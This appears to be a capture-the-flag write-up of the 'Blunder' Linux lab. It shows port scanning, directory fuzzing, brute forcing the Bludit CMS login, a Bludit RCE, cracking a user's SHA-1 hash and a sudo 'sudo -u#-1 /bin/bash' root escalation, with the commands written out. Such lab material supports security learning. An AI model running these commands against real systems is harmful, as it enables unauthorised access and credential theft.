## Blunder  

### Lab Details 

- Difficulty: Easy
- Type:   Linux

#### Tasks

Q1: How many TCP ports are open on the remote host?
 - `nmap -sT -T4 -vv -A -p- -oA Blunder 10.10.10.191`

Q2: What is the name of the unusual file that dirbusting reveals?
 - scanned for - using /usr/share/wordlists/dirb/big.txt, unable to find any interesting files
 ``` 
   ffuf -u http://10.10.10.191/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .ext1 .ext2 .ext3
   .php 
   .pdf 
   .txt 
   .config 
   .js 
   .md 
   .html
   .xml
   .cgi
   .ini
   .log
   .dat
   .cfg
   .yml 
``` 
 - scanned again - using /usr/sharewordlists/dirb/common.txt 
``` 
 [Status: 200, Size: 118, Words: 20, Lines: 5, Duration: 309ms]
    * FUZZ: todo.txt
```
 - `curl http://target_ip/todo.txt`
 ```
 -Update the CMS
 -Turn off FTP - DONE
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
 ```

Q3: What is the version of Bludit CMS that is used?
 - the version can be found using curl 
 - `curl http://target_ip/`
 ```
         <!-- Javascript -->
        <script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=**3.9.2**"></script>
<script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=**3.9.2**"></script>

        <!-- Load Plugins: Site Body End -->

</body>
</html>
 ```

Q4: What is the password for the user "fergus" on Bludit CMS?
- admin panel is located at http://target_ip/admin
- tool like hydra, medusa or burpsuite can be used to conduct login bruteforce
- below is example using medusa
```
medusa -h 10.10.10.191 -u fergus -P /usr/share/wordlists/rockyou.txt  -M http -t 2   
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [http] Host: 10.10.10.191 (1 of 1, 0 complete) User: fergus (1 of 1, 0 complete) Password: 12345 (1 of 14344391 complete)
ACCOUNT FOUND: [http] Host: 10.10.10.191 User: fergus Password: 12345 [SUCCESS]
ACCOUNT CHECK: [http] Host: 10.10.10.191 (1 of 1, 0 complete) User: fergus (1 of 1, 1 complete) Password: 123456 (2 of 14344391 complete)
ACCOUNT FOUND: [http] Host: 10.10.10.191 User: fergus Password: 123456 [SUCCESS]
```
- however when attempting login with found password, getting username or password error
- attempted with hydra getting the same error
- tried different wordlist, found both tools are giving false positives
- searched Bludit 3.9.2 github and found https://github.com/noraj/Bludit-auth-BF-bypass
    - used cewl to create a custom wordlist by scrapping target site
    - `cewl http://10.10.10.191 -m 5 -w custom_wordlist.txt` 
    - run the auth BF bypass script 
    - `ruby exploit.rb -r http://10.10.10.191/admin -u fergus -w custom_wordlist.txt`
    ```
    ...
    [+] Password found: RolandDeschain
    ```
Q5: What is the 2019 CVE ID for a remote code execution vulnerability in Bludit 3.9.2?
- search for Bludit 3.9.2 RCE POC
- CVE-2019-16113

Q6: What is the password of the user Hugo?
- after running the exploit from above, a shell can be gained with user www-data
- run linpea.sh, found a user.php file at a different version of blundit 
```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files 
...
/var/www/bludit-3.10.0a/bl-content/databases/users.php
...
```
- which contains hash of hugo
```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

````
- check hashtype `hashid "faca404fd5c0a31cf1897b823c695c85cffeb98d"`
```
Analyzing 'faca404fd5c0a31cf1897b823c695c85cffeb98d'
[+] SHA-1
... 
```
- use https://www.dcode.fr/sha1-hash to decrypt the hash 
- `password: Password120`

Q7: Submit the flag located in the hugo user's home directory.
- since the default shell from CVE-2019-16113 is not interactive, the shell needs to be upgrade to run `su`
- python is installed the target can use to upgrade 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
- su hugo -> cat /home/hugo/user.txt


Q8: What 2019 CVE ID is related to the currently installed Sudo version?
- according to the result from linpeas.sh 
- current sudo version is 1.8.25p1
```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                               
Sudo version 1.8.25p1   
```
- which according to https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/
- we can use below to exploit and gain root shell
```
sudo -u#-1 /bin/bash
```
- `cat /root/root.txt


#### Lesson Learned
 - If one wordlist doesnt work try a couple different ones, like as file extensions 
